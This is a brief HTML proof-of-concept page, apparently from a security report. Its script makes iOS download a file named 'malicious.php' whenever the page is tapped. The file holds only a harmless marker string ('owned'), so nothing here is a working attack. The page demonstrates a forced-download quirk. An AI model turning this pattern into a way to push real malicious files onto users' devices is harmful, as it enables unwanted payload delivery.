<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>iOS Download POC</title>
<style>
  body {
    height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: sans-serif;
    background: #fafafa;
    cursor: pointer;
  }
  h1 {
    text-align: center;
    max-width: 420px;
  }
</style>
</head>
<body>

<h1>
Tap anywhere.<br>
iOS will download a file.
</h1>

<script>
document.addEventListener('click', () => {
  const payload = `<?php echo "owned"; ?>`;

  const blob = new Blob([payload], {
    type: 'application/octet-stream'
  });

  const url = URL.createObjectURL(blob);

  const a = document.createElement('a');
  a.href = url;
  a.download = 'malicious.php'; // iOS will still offer download
  document.body.appendChild(a);
  a.click();

  setTimeout(() => {
    URL.revokeObjectURL(url);
    a.remove();
  }, 1000);
}, { once: true });
</script>

</body>
</html>
